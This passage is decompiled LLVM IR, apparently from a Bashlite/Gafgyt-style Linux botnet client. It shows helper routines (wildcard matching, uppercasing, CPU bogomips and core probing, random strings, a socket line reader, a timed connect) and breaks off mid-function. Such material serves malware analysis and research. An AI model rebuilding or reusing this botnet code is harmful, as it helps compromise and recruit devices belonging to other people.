  %v2_8048f32 = load i8, i8* %tmp12, align 1
  %v3_8048f32 = zext i8 %v2_8048f32 to i32
  %v2_8048f3b = call i32 @__GI_toupper(i32 %v3_8048f32)
  %v0_8048f40 = load i32, i32* @ebx, align 4
  %v12_8048f40 = icmp eq i32 %v0_8048f40, %v2_8048f3b
  %v1_8048f42 = icmp eq i1 %v12_8048f40, false
  br i1 %v1_8048f42, label %dec_label_pc_8048f6c, label %dec_label_pc_8048f44

dec_label_pc_8048f44:                             ; preds = %dec_label_pc_8048f1c
  %v1_8048f47 = add i32 %arg2, 1
  %v1_8048f4b = add i32 %v4_8048e5b, 1
  %v4_8048f50 = inttoptr i32 %v1_8048f4b to i8*
  %v5_8048f53 = call i32 @wildString(i8* %v4_8048f50, i32 %v1_8048f47)
  %v1_8048f58 = icmp ne i32 %v5_8048f53, 0
  %.6 = zext i1 %v1_8048f58 to i32
  br label %dec_label_pc_8048f6c

dec_label_pc_8048f6c:                             ; preds = %dec_label_pc_8048f44, %dec_label_pc_8048f1c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048f1c ], [ %.6, %dec_label_pc_8048f44 ]
  br label %dec_label_pc_8048f72

dec_label_pc_8048f72:                             ; preds = %dec_label_pc_8048f14, %dec_label_pc_8048ed7, %dec_label_pc_8048e7e, %dec_label_pc_8048f6c
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_8048ed7 ], [ %storemerge4, %dec_label_pc_8048f14 ], [ %v3_8048e81, %dec_label_pc_8048e7e ], [ %storemerge, %dec_label_pc_8048f6c ]
  %v2_8048f78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048f78, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048e5e, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048f72, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048ed7, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048f7b = load i32, i32* @ebp, align 4
  %v1_8048f87 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048f87, i32* %arg2, align 4
  %v10_8048f98 = icmp eq i32 %v1_8048f87, -1
  %. = zext i1 %v10_8048f98 to i32
  store i32 %v0_8048f7b, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048fb2 = load i32, i32* @ebp, align 4
  store i32 %v0_8048fb2, i32* %stack_var_-4, align 4
  %v4_8048fd54 = ptrtoint i8* %arg1 to i32
  %v2_8048fd85 = load i8, i8* %arg1, align 1
  %v4_8048fdb7 = icmp eq i8 %v2_8048fd85, 0
  %v1_8048fdd9 = icmp eq i1 %v4_8048fdb7, false
  br i1 %v1_8048fdd9, label %dec_label_pc_8048fba, label %dec_label_pc_8048fdf

dec_label_pc_8048fba:                             ; preds = %entry, %dec_label_pc_8048fba
  %v4_8048fd511 = phi i32 [ %v5_8048fd2, %dec_label_pc_8048fba ], [ %v4_8048fd54, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048fd2, %dec_label_pc_8048fba ], [ %arg1, %entry ]
  %v2_8048fbd = load i8, i8* %stack_var_4.010, align 1
  %v3_8048fbd = zext i8 %v2_8048fbd to i32
  %v1_8048fc6 = call i32 @__GI_toupper(i32 %v3_8048fbd)
  %v1_8048fd0 = trunc i32 %v1_8048fc6 to i8
  store i8 %v1_8048fd0, i8* %stack_var_4.010, align 1
  %v5_8048fd2 = add i32 %v4_8048fd511, 1
  %v22_8048fd2 = inttoptr i32 %v5_8048fd2 to i8*
  %v2_8048fd8 = load i8, i8* %v22_8048fd2, align 1
  %v4_8048fdb = icmp eq i8 %v2_8048fd8, 0
  %v1_8048fdd = icmp eq i1 %v4_8048fdb, false
  br i1 %v1_8048fdd, label %dec_label_pc_8048fba, label %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge

dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge: ; preds = %dec_label_pc_8048fba
  %v2_8048fdf.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048fdf

dec_label_pc_8048fdf:                             ; preds = %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge, %entry
  %v2_8048fdf = phi i32 [ %v2_8048fdf.pre, %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge ], [ %v0_8048fb2, %entry ]
  %v3_8048fd8.lcssa.in = phi i8 [ %v2_8048fd8, %dec_label_pc_8048fd5.dec_label_pc_8048fdf_crit_edge ], [ %v2_8048fd85, %entry ]
  %v3_8048fd8.lcssa = zext i8 %v3_8048fd8.lcssa.in to i32
  store i32 %v2_8048fdf, i32* @ebp, align 4
  ret i32 %v3_8048fd8.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048fd2, { 1, 0 }
  uselistorder i32 %v5_8048fd2, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048fba, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048ffa = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052e40.24, i32 0, i32 0), i32 0)
  %v2_804915a = ptrtoint i32* %stack_var_-4112 to i32
  %tmp22 = bitcast i32* %stack_var_-4112 to i8*
  %v5_804917224 = call i32 @fdgets(i32 %v2_804915a, i32 4096, i32 %v5_8048ffa)
  %v1_804917725 = icmp eq i32 %v5_804917224, 0
  %v1_804917927 = icmp eq i1 %v1_804917725, false
  br i1 %v1_804917927, label %dec_label_pc_8049007, label %dec_label_pc_804917f

dec_label_pc_8049007:                             ; preds = %entry, %dec_label_pc_8049139
  %v3_8049010 = call i32 @uppercase(i8* %tmp22)
  %v5_8049026 = call i32 @strstr(i32 %v2_804915a, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052e4e.25, i32 0, i32 0))
  %v12_8049033 = icmp eq i32 %v5_8049026, %v2_804915a
  %v1_8049035 = icmp eq i1 %v12_8049033, false
  br i1 %v1_8049035, label %dec_label_pc_8049139, label %dec_label_pc_804903b

dec_label_pc_804903b:                             ; preds = %dec_label_pc_8049007
  %tmp23 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_804904c

dec_label_pc_8049049:                             ; preds = %dec_label_pc_8049060, %dec_label_pc_8049056, %dec_label_pc_804904c
  %v5_8049049 = add i32 %v4_804904c, 1
  %v22_8049049 = inttoptr i32 %v5_8049049 to i8*
  br label %dec_label_pc_804904c

dec_label_pc_804904c:                             ; preds = %dec_label_pc_804903b, %dec_label_pc_8049049
  %storemerge4 = phi i8* [ %v22_8049049, %dec_label_pc_8049049 ], [ %tmp23, %dec_label_pc_804903b ]
  %v4_804904c = ptrtoint i8* %storemerge4 to i32
  %v2_804904f = load i8, i8* %storemerge4, align 1
  %v7_8049052 = icmp eq i8 %v2_804904f, 32
  br i1 %v7_8049052, label %dec_label_pc_8049049, label %dec_label_pc_8049056

dec_label_pc_8049056:                             ; preds = %dec_label_pc_804904c
  %v2_8049059 = load i8, i8* %storemerge4, align 1
  %v10_804905c = icmp eq i8 %v2_8049059, 9
  br i1 %v10_804905c, label %dec_label_pc_8049049, label %dec_label_pc_8049060

dec_label_pc_8049060:                             ; preds = %dec_label_pc_8049056
  %v2_8049063 = load i8, i8* %storemerge4, align 1
  %v10_8049066 = icmp eq i8 %v2_8049063, 58
  br i1 %v10_8049066, label %dec_label_pc_8049049, label %dec_label_pc_8049091.preheader

dec_label_pc_8049091.preheader:                   ; preds = %dec_label_pc_8049060
  br label %dec_label_pc_8049091

dec_label_pc_804906c:                             ; preds = %dec_label_pc_80490ba, %dec_label_pc_8049091
  %v3_8049083 = call i32 @_strlen(i8* %storemerge4)
  %v6_804908a = add i32 %v4_804904c, %v3_8049083
  %v1_804908d = add i32 %v6_804908a, -1
  %v1_804908e = inttoptr i32 %v1_804908d to i8*
  store i8 0, i8* %v1_804908e, align 1
  br label %dec_label_pc_8049091

dec_label_pc_8049091:                             ; preds = %dec_label_pc_8049091.preheader, %dec_label_pc_804906c
  %v3_80490a8 = call i32 @_strlen(i8* %storemerge4)
  %v6_80490af = add i32 %v4_804904c, %v3_80490a8
  %v1_80490b2 = add i32 %v6_80490af, -1
  %v1_80490b3 = inttoptr i32 %v1_80490b2 to i8*
  %v2_80490b3 = load i8, i8* %v1_80490b3, align 1
  %v10_80490b6 = icmp eq i8 %v2_80490b3, 13
  br i1 %v10_80490b6, label %dec_label_pc_804906c, label %dec_label_pc_80490ba

dec_label_pc_80490ba:                             ; preds = %dec_label_pc_8049091
  store i32 %v4_804904c, i32* @edi, align 4
  %v3_80490d1 = call i32 @_strlen(i8* %storemerge4)
  %v6_80490d8 = add i32 %v4_804904c, %v3_80490d1
  %v1_80490db = add i32 %v6_80490d8, -1
  %v1_80490dc = inttoptr i32 %v1_80490db to i8*
  %v2_80490dc = load i8, i8* %v1_80490dc, align 1
  %v10_80490df = icmp eq i8 %v2_80490dc, 10
  br i1 %v10_80490df, label %dec_label_pc_804906c, label %dec_label_pc_80490e3

dec_label_pc_80490e3:                             ; preds = %dec_label_pc_80490ba
  %v5_80490f1 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v1_80490f6 = icmp eq i32 %v5_80490f1, 0
  br i1 %v1_80490f6, label %dec_label_pc_8049110, label %dec_label_pc_80490fa

dec_label_pc_80490fa:                             ; preds = %dec_label_pc_80490e3
  %v5_8049108 = call i32 @__GI_strchr(i8* %storemerge4, i32 46)
  %v6_8049108 = inttoptr i32 %v5_8049108 to i8*
  store i8 0, i8* %v6_8049108, align 1
  br label %dec_label_pc_8049110

dec_label_pc_8049110:                             ; preds = %dec_label_pc_80490e3, %dec_label_pc_80490fa
  store i32 %v4_804904c, i32* @eax, align 4
  %v4_804911a = inttoptr i32 %arg1 to i8*
  %v5_804911d = call i32 @strcpy(i8* %v4_804911a, i32 %v4_804904c)
  %v2_8049128 = call i32 @__libc_close(i32 %v5_8048ffa)
  br label %dec_label_pc_8049194

dec_label_pc_8049139:                             ; preds = %dec_label_pc_8049007
  %v6_8049155 = call i32 @__GI_memset(i8* %tmp22, i32 0, i32 4096)
  %v5_8049172 = call i32 @fdgets(i32 %v2_804915a, i32 4096, i32 %v5_8048ffa)
  %v1_8049177 = icmp eq i32 %v5_8049172, 0
  %v1_8049179 = icmp eq i1 %v1_8049177, false
  br i1 %v1_8049179, label %dec_label_pc_8049007, label %dec_label_pc_804917f

dec_label_pc_804917f:                             ; preds = %dec_label_pc_8049139, %entry
  %v2_8049185 = call i32 @__libc_close(i32 %v5_8048ffa)
  br label %dec_label_pc_8049194

dec_label_pc_8049194:                             ; preds = %dec_label_pc_8049110, %dec_label_pc_804917f
  %storemerge = phi i32 [ 1, %dec_label_pc_804917f ], [ 0, %dec_label_pc_8049110 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804904c, { 4, 3, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_804915a, { 3, 0, 2, 1 }
  uselistorder i32 %v5_8048ffa, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8049194, { 1, 0 }
  uselistorder label %dec_label_pc_8049110, { 1, 0 }
  uselistorder label %dec_label_pc_8049091, { 1, 0 }
  uselistorder label %dec_label_pc_804904c, { 1, 0 }
  uselistorder label %dec_label_pc_8049007, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80491a3 = load i32, i32* @ebp, align 4
  store i32 %v0_80491a3, i32* %stack_var_-4, align 4
  %v4_80491a3 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80491a3, i32* @ebp, align 4
  %v5_80491c2 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052e40.24, i32 0, i32 0), i32 0)
  %v2_8049220 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp10 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804923811 = call i32 @fdgets(i32 %v2_8049220, i32 4096, i32 %v5_80491c2)
  %v1_804923d12 = icmp eq i32 %v5_804923811, 0
  %v1_804923f14 = icmp eq i1 %v1_804923d12, false
  br i1 %v1_804923f14, label %dec_label_pc_80491cc, label %dec_label_pc_8049241

dec_label_pc_80491cc:                             ; preds = %entry, %dec_label_pc_80491ff
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.0, %dec_label_pc_80491ff ], [ 0, %entry ]
  %v3_80491d5 = call i32 @uppercase(i8* %tmp10)
  %v5_80491eb = call i32 @strstr(i32 %v2_8049220, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052e4e.25, i32 0, i32 0))
  %v12_80491f8 = icmp eq i32 %v5_80491eb, %v2_8049220
  %v1_80491fa = icmp eq i1 %v12_80491f8, false
  br i1 %v1_80491fa, label %dec_label_pc_80491ff, label %dec_label_pc_80491fc

dec_label_pc_80491fc:                             ; preds = %dec_label_pc_80491cc
  %v4_80491fc = add i32 %stack_var_-12.115, 1
  br label %dec_label_pc_80491ff

dec_label_pc_80491ff:                             ; preds = %dec_label_pc_80491cc, %dec_label_pc_80491fc
  %stack_var_-12.0 = phi i32 [ %stack_var_-12.115, %dec_label_pc_80491cc ], [ %v4_80491fc, %dec_label_pc_80491fc ]
  %v6_804921b = call i32 @__GI_memset(i8* %tmp10, i32 0, i32 4096)
  %v5_8049238 = call i32 @fdgets(i32 %v2_8049220, i32 4096, i32 %v5_80491c2)
  %v1_804923d = icmp eq i32 %v5_8049238, 0
  %v1_804923f = icmp eq i1 %v1_804923d, false
  br i1 %v1_804923f, label %dec_label_pc_80491cc, label %dec_label_pc_8049241

dec_label_pc_8049241:                             ; preds = %dec_label_pc_80491ff, %entry
  %stack_var_-12.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-12.0, %dec_label_pc_80491ff ]
  %v2_8049247 = call i32 @__libc_close(i32 %v5_80491c2)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049220, { 3, 0, 2, 1 }
  uselistorder i32 %v5_80491c2, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_80491ff, { 1, 0 }
  uselistorder label %dec_label_pc_80491cc, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049251 = load i32, i32* @ebp, align 4
  store i32 %v0_8049251, i32* %stack_var_-4, align 4
  %v0_8049254 = load i32, i32* @ebx, align 4
  store i32 %v0_8049254, i32* %stack_var_-8, align 4
  %v5_804926d = ptrtoint i8* %arg1 to i32
  %v5_80492b325 = icmp sgt i32 %arg2, 0
  br i1 %v5_80492b325, label %dec_label_pc_8049268, label %dec_label_pc_80492b5

dec_label_pc_8049268:                             ; preds = %entry, %dec_label_pc_8049268
  %storemerge26 = phi i32 [ %v4_80492aa, %dec_label_pc_8049268 ], [ 0, %entry ]
  %v6_804926d = add i32 %storemerge26, %v5_804926d
  store i32 %v6_804926d, i32* @ebx, align 4
  %v1_8049270 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_8049285 = udiv i32 %v1_8049270, 26
  %tmp = mul i32 %v2_8049285, -10
  %v2_804929d = add i32 %v1_8049270, %tmp
  %v14_804929d = trunc i32 %v2_804929d to i8
  %v2_80492a6 = add i8 %v14_804929d, 65
  %v2_80492a8 = load i32, i32* @ebx, align 4
  %v3_80492a8 = inttoptr i32 %v2_80492a8 to i8*
  store i8 %v2_80492a6, i8* %v3_80492a8, align 1
  %v4_80492aa = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_80492aa, %arg2
  br i1 %exitcond, label %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge, label %dec_label_pc_8049268

dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge: ; preds = %dec_label_pc_8049268
  %v2_80492b8.pre = load i32, i32* %stack_var_-8, align 4
  %v2_80492b9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80492b5

dec_label_pc_80492b5:                             ; preds = %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge, %entry
  %v2_80492b9 = phi i32 [ %v2_80492b9.pre, %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge ], [ %v0_8049251, %entry ]
  %v2_80492b8 = phi i32 [ %v2_80492b8.pre, %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge ], [ %v0_8049254, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80492ad.dec_label_pc_80492b5_crit_edge ], [ 0, %entry ]
  store i32 %v2_80492b8, i32* @ebx, align 4
  store i32 %v2_80492b9, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_80492aa, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049268, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80492be = load i32, i32* @edi, align 4
  store i32 %v0_80492be, i32* %stack_var_-8, align 4
  %v4_80492c8 = ptrtoint i8* %arg2 to i32
  %v1_80492d0 = and i32 %v4_80492c8, -256
  %v5_80492d2 = call i8* @_memset(i8* %arg2, i32 %v1_80492d0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_80492f2 = ptrtoint i32* %stack_var_-168 to i32
  %tmp30 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80492f2, i32* @edi, align 4
  %v5_80492f9 = call i8* @_memset(i8* %tmp30, i32 0, i32 32)
  %v2_8049306 = udiv i32 %arg1, 32
  %v1_804930c = urem i32 %arg1, 32
  %v0_804930f = load i32, i32* @ebp, align 4
  %v2_804930f = mul nuw nsw i32 %v2_8049306, 4
  %v3_804930f = add nsw i32 %v2_804930f, -164
  %v4_804930f = add i32 %v3_804930f, %v0_804930f
  %v5_804930f = inttoptr i32 %v4_804930f to i32*
  %v6_804930f = load i32, i32* %v5_804930f, align 4
  %v9_804930f = shl i32 1, %v1_804930c
  %v12_804930f = or i32 %v6_804930f, %v9_804930f
  store i32 %v12_804930f, i32* %v5_804930f, align 4
  %v1_804931a = add i32 %arg1, 1
  %v2_804931b = ptrtoint i32* %stack_var_-176 to i32
  %v7_8049344 = call i32 @__libc_select(i32 %v1_804931a, i32 %v2_80492f2, i32 0, i32 %v2_80492f2, i32 %v2_804931b)
  %tmp31 = icmp slt i32 %v7_8049344, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br i1 %tmp32, label %dec_label_pc_80493fb, label %dec_label_pc_80493f1.preheader

dec_label_pc_80493f1.preheader:                   ; preds = %entry
  %v7_80493f544 = icmp sgt i32 %tmp9, 9
  br i1 %v7_80493f544, label %dec_label_pc_80493fb, label %dec_label_pc_804935b

dec_label_pc_804935b:                             ; preds = %dec_label_pc_80493f1.preheader, %dec_label_pc_80493ee
  %stack_var_-36.045 = phi i32 [ %v4_80493ee, %dec_label_pc_80493ee ], [ %tmp9, %dec_label_pc_80493f1.preheader ]
  %v0_804935b = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804935b = ptrtoint i8* %v0_804935b to i32
  %v4_804936b = call i32 @sockprintf(i32 %v1_804935b, i32 ptrtoint ([5 x i8]* @global_var_8052e57.27 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_80492f2, i32* @edi, align 4
  %v5_8049395 = call i8* @_memset(i8* %tmp30, i32 0, i32 32)
  %v0_80493ab = load i32, i32* @ebp, align 4
  %v4_80493ab = add i32 %v3_804930f, %v0_80493ab
  %v5_80493ab = inttoptr i32 %v4_80493ab to i32*
  %v6_80493ab = load i32, i32* %v5_80493ab, align 4
  %v12_80493ab = or i32 %v6_80493ab, %v9_804930f
  store i32 %v12_80493ab, i32* %v5_80493ab, align 4
  %v7_80493e0 = call i32 @__libc_select(i32 %v1_804931a, i32 %v2_80492f2, i32 0, i32 %v2_80492f2, i32 %v2_804931b)
  %tmp33 = icmp slt i32 %v7_80493e0, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_80493fb, label %dec_label_pc_80493ee

dec_label_pc_80493ee:                             ; preds = %dec_label_pc_804935b
  %v4_80493ee = add nsw i32 %stack_var_-36.045, 1
  %v7_80493f5 = icmp sgt i32 %stack_var_-36.045, 8
  br i1 %v7_80493f5, label %dec_label_pc_80493fb, label %dec_label_pc_804935b

dec_label_pc_80493fb:                             ; preds = %dec_label_pc_80493f1.preheader, %dec_label_pc_804935b, %dec_label_pc_80493ee, %entry
  %v2_804941f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049465

dec_label_pc_804940a:                             ; preds = %dec_label_pc_8049465
  %v0_804940a = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804940a = ptrtoint i8* %v0_804940a to i32
  %v6_804942c = call i32 @__libc_recv(i32 %v1_804940a, i32 %v2_804941f, i32 1, i32 0)
  %v9_8049431 = icmp eq i32 %v6_804942c, 1
  br i1 %v9_8049431, label %dec_label_pc_8049448, label %dec_label_pc_8049436

dec_label_pc_8049436:                             ; preds = %dec_label_pc_804940a
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049482

dec_label_pc_8049448:                             ; preds = %dec_label_pc_804940a
  %v3_8049448 = load i8, i8* %stack_var_-177, align 1
  %v4_804944f = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049448, i8* %stack_var_-32.0, align 1
  %v5_8049454 = add i32 %v4_804944f, 1
  %v22_8049454 = inttoptr i32 %v5_8049454 to i8*
  %v3_8049457 = load i8, i8* %stack_var_-177, align 1
  %v10_804945e = icmp eq i8 %v3_8049457, 10
  br i1 %v10_804945e, label %dec_label_pc_8049473, label %dec_label_pc_8049462

dec_label_pc_8049462:                             ; preds = %dec_label_pc_8049448
  %v4_8049462 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049465

dec_label_pc_8049465:                             ; preds = %dec_label_pc_80493fb, %dec_label_pc_8049462
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80493fb ], [ %v22_8049454, %dec_label_pc_8049462 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80493fb ], [ %v4_8049462, %dec_label_pc_8049462 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80493fb ], [ %v4_8049465, %dec_label_pc_8049462 ]
  %v4_8049465 = add i32 %stack_var_12.0, -1
  %v9_8049465 = sub i32 0, %stack_var_12.0
  %v10_8049465 = and i32 %stack_var_12.0, %v9_8049465
  %v11_8049465 = icmp slt i32 %v10_8049465, 0
  %v12_8049465 = icmp eq i32 %v4_8049465, 0
  %v13_8049465 = icmp slt i32 %v4_8049465, 0
  %v3_8049469 = icmp eq i1 %v13_8049465, %v11_8049465
  %v4_8049469 = icmp eq i1 %v12_8049465, false
  %v5_8049469 = and i1 %v4_8049469, %v3_8049469
  %v4_804946f = icmp eq i1 %v5_8049469, false
  %v1_8049471 = icmp eq i1 %v4_804946f, false
  br i1 %v1_8049471, label %dec_label_pc_804940a, label %dec_label_pc_8049473

dec_label_pc_8049473:                             ; preds = %dec_label_pc_8049448, %dec_label_pc_8049465
  %stack_var_-32.1 = phi i8* [ %v22_8049454, %dec_label_pc_8049448 ], [ %stack_var_-32.0, %dec_label_pc_8049465 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8049482

dec_label_pc_8049482:                             ; preds = %dec_label_pc_8049436, %dec_label_pc_8049473
  %storemerge = phi i32 [ -1, %dec_label_pc_8049436 ], [ %stack_var_-28.0, %dec_label_pc_8049473 ]
  %v2_804948e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804948e, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049465, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8049454, { 1, 0 }
  uselistorder i32 %v2_80492f2, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049482, { 1, 0 }
  uselistorder label %dec_label_pc_8049473, { 1, 0 }
  uselistorder label %dec_label_pc_8049465, { 1, 0 }
  uselistorder label %dec_label_pc_80493fb, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804935b, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049494 = load i32, i32* @edi, align 4
  store i32 %v0_8049494, i32* %stack_var_-8, align 4
  %v3_80494b1 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80494b9 = or i32 %v3_80494b1, 2048
  %v3_80494d5 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80494b9)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80494e9 = trunc i32 %arg3 to i16
  %v2_80494e9 = call i32 @htons(i16 %v1_80494e9)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049505 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_804950a = icmp eq i32 %v3_8049505, 0
  br i1 %v1_804950a, label %dec_label_pc_804951d, label %dec_label_pc_804968d

dec_label_pc_804951d:                             ; preds = %entry
  %v2_80494f8 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8049545 = call i32 @__libc_connect(i32 %arg1, i32 %v2_80494f8, i32 16)
  %v5_804954d = icmp slt i32 %v3_8049545, 0
  %v1_8049551 = icmp eq i1 %v5_804954d, false
  br i1 %v1_8049551, label %dec_label_pc_8049644, label %dec_label_pc_8049557

dec_label_pc_8049557:                             ; preds = %dec_label_pc_804951d
  %v1_8049557 = call i32 @__errno_location(i32 %v3_8049545)
  %v1_804955c = inttoptr i32 %v1_8049557 to i32*
  %v2_804955c = load i32, i32* %v1_804955c, align 4
  %v9_804955e = icmp eq i32 %v2_804955c, 115
  %v1_8049561 = icmp eq i1 %v9_804955e, false
  br i1 %v1_8049561, label %dec_label_pc_804968d, label %dec_label_pc_8049567

dec_label_pc_8049567:                             ; preds = %dec_label_pc_8049557
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049584 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049584, i32* @edi, align 4
  %v5_804958b = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049598 = udiv i32 %arg1, 32
  %v1_804959e = urem i32 %arg1, 32
  %v0_80495a1 = load i32, i32* @ebp, align 4
  %v2_80495a1 = mul nuw nsw i32 %v2_8049598, 4
  %v3_80495a1 = add nsw i32 %v2_80495a1, -164
  %v4_80495a1 = add i32 %v3_80495a1, %v0_80495a1
  %v5_80495a1 = inttoptr i32 %v4_80495a1 to i32*
  %v6_80495a1 = load i32, i32* %v5_80495a1, align 4
  %v9_80495a1 = shl i32 1, %v1_804959e
  %v12_80495a1 = or i32 %v6_80495a1, %v9_80495a1
  store i32 %v12_80495a1, i32* %v5_80495a1, align 4
  %v1_80495ac = add i32 %arg1, 1
  %v2_80495ad = ptrtoint i32* %stack_var_-176 to i32
  %v5_80495d4 = call i32 @__libc_select(i32 %v1_80495ac, i32 0, i32 %v2_8049584, i32 0, i32 %v2_80495ad)
  %tmp28 = icmp slt i32 %v5_80495d4, 1
  br i1 %tmp28, label %dec_label_pc_804968d, label %dec_label_pc_80495dd

dec_label_pc_80495dd:                             ; preds = %dec_label_pc_8049567
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80495e7 = ptrtoint i32* %stack_var_-180 to i32
  %v2_80495f1 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049611 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80495f1, i32 %v2_80495e7)
  %v3_8049616 = load i32, i32* %stack_var_-184, align 4
  %v1_804961c = icmp eq i32 %v3_8049616, 0
  br i1 %v1_804961c, label %dec_label_pc_8049644, label %dec_label_pc_804968d

dec_label_pc_8049644:                             ; preds = %dec_label_pc_80495dd, %dec_label_pc_804951d
